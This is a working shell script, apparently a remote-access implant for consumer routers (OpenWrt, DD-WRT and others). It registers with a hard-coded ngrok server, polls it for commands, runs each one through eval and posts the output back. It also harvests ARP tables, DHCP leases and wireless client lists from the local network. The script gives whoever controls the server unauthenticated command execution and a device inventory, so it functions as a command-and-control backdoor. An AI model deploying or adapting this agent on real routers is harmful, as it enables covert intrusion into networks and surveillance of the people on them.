#!/bin/sh
# Minimal Remote Access Agent for Routers
# Compatible with: OpenWrt, DD-WRT, Tomato, AsusWRT, etc.
# Requirements: sh, curl OR wget

# ===== CONFIGURATION =====
SERVER_URL="https://0630f218ce93.ngrok-free.app"
POLL_INTERVAL=10  # seconds between polls

# ===== AGENT IDENTIFICATION =====
generate_agent_id() {
    # Try multiple methods to generate unique ID
    if [ -f /proc/sys/kernel/random/uuid ]; then
        cat /proc/sys/kernel/random/uuid
    elif [ -f /etc/machine-id ]; then
        cat /etc/machine-id
    else
        echo "router-$(date +%s)-$$"
    fi
}

AGENT_ID=$(generate_agent_id)

# ===== DETECT HTTP CLIENT =====
if command -v curl >/dev/null 2>&1; then
    HTTP_CLIENT="curl"
elif command -v wget >/dev/null 2>&1; then
    HTTP_CLIENT="wget"
else
    echo "ERROR: Neither curl nor wget found!"
    exit 1
fi

# ===== HTTP FUNCTIONS =====
http_get() {
    url=$1
    if [ "$HTTP_CLIENT" = "curl" ]; then
        curl -s "$url"
    else
        wget -q -O- "$url"
    fi
}

http_post() {
    url=$1
    data=$2
    if [ "$HTTP_CLIENT" = "curl" ]; then
        curl -s -X POST -H "Content-Type: application/json" -d "$data" "$url"
    else
        wget -q -O- --post-data="$data" --header="Content-Type: application/json" "$url"
    fi
}

# ===== SYSTEM INFO COLLECTION =====
get_system_info() {
    # Basic info
    OS=$(uname -s)
    ARCH=$(uname -m)
    HOSTNAME=$(hostname)
    KERNEL=$(uname -r)
    
    # Memory (if free command exists)
    if command -v free >/dev/null 2>&1; then
        MEM_TOTAL=$(free -m | awk 'NR==2{print $2}')
        MEM_USED=$(free -m | awk 'NR==2{print $3}')
    else
        MEM_TOTAL="N/A"
        MEM_USED="N/A"
    fi
    
    # Uptime
    UPTIME=$(uptime | awk '{print $3,$4}' | sed 's/,//')
    
    # IP Address
    IP_ADDR=$(ip addr show | grep 'inet ' | grep -v '127.0.0.1' | head -1 | awk '{print $2}' | cut -d/ -f1)
    
    # Build JSON
    cat <<EOF
{
  "agentId": "$AGENT_ID",
  "type": "router",
  "os": "$OS",
  "arch": "$ARCH",
  "hostname": "$HOSTNAME",
  "kernel": "$KERNEL",
  "memory": {
    "total": "$MEM_TOTAL MB",
    "used": "$MEM_USED MB"
  },
  "uptime": "$UPTIME",
  "ip": "$IP_ADDR"
}
EOF
}

# ===== NETWORK SCANNING =====
scan_network() {
    echo "=== NETWORK SCAN RESULTS ==="
    echo ""
    
    # Method 1: ARP table (most reliable)
    if command -v arp >/dev/null 2>&1; then
        echo "--- ARP Table ---"
        arp -a
        echo ""
    fi
    
    # Method 2: IP neighbor (modern alternative)
    if command -v ip >/dev/null 2>&1; then
        echo "--- IP Neighbors ---"
        ip neigh show
        echo ""
    fi
    
    # Method 3: DHCP leases
    if [ -f /tmp/dhcp.leases ]; then
        echo "--- DHCP Leases (OpenWrt) ---"
        cat /tmp/dhcp.leases
        echo ""
    elif [ -f /var/lib/misc/dnsmasq.leases ]; then
        echo "--- DHCP Leases (dnsmasq) ---"
        cat /var/lib/misc/dnsmasq.leases
        echo ""
    fi
    
    # Method 4: Wireless clients
    if command -v hostapd_cli >/dev/null 2>&1; then
        echo "--- Wireless Clients ---"
        hostapd_cli all_sta
        echo ""
    fi
    
    # Method 5: Connected interfaces
    if command -v iwinfo >/dev/null 2>&1; then
        echo "--- WiFi Info ---"
        iwinfo
        echo ""
    fi
}

# ===== REGISTER WITH SERVER =====
register_agent() {
    echo "Registering router agent..."
    SYSINFO=$(get_system_info)
    RESPONSE=$(http_post "$SERVER_URL/agent/register-router" "$SYSINFO")
    echo "Registration response: $RESPONSE"
}

# ===== EXECUTE COMMAND =====
execute_command() {
    cmd=$1
    echo "Executing: $cmd"
    
    # Special commands for network scanning
    case "$cmd" in
        "scan_network"|"list_devices"|"show_devices")
            output=$(scan_network)
            exit_code=0
            ;;
        *)
            # Regular command execution
            output=$(eval "$cmd" 2>&1)
            exit_code=$?
            ;;
    esac
    
    # Escape output for JSON (basic escaping)
    output=$(echo "$output" | sed 's/\\/\\\\/g' | sed 's/"/\\"/g' | tr '\n' ' ')
    
    # Build result JSON
    result=$(cat <<EOF
{
  "agentId": "$AGENT_ID",
  "output": "$output",
  "exitCode": $exit_code
}
EOF
)
    
    # Send result back to server
    http_post "$SERVER_URL/agent/command-result" "$result"
}

# ===== MAIN POLLING LOOP =====
poll_for_commands() {
    echo "Starting command polling (every ${POLL_INTERVAL}s)..."
    
    while true; do
        # Ask server for pending commands
        response=$(http_get "$SERVER_URL/agent/poll/$AGENT_ID")
        
        # Check if there's a command
        if [ ! -z "$response" ] && [ "$response" != "null" ] && [ "$response" != "{}" ]; then
            # Extract command (basic JSON parsing)
            command=$(echo "$response" | grep -o '"command":"[^"]*"' | cut -d'"' -f4)
            
            if [ ! -z "$command" ]; then
                execute_command "$command"
            fi
        fi
        
        sleep $POLL_INTERVAL
    done
}

# ===== STARTUP =====
echo "====================================="
echo "Router Remote Access Agent"
echo "====================================="
echo "Agent ID: $AGENT_ID"
echo "HTTP Client: $HTTP_CLIENT"
echo "Server: $SERVER_URL"
echo "====================================="
echo ""

# Register on startup
register_agent

# Start polling loop
poll_for_commands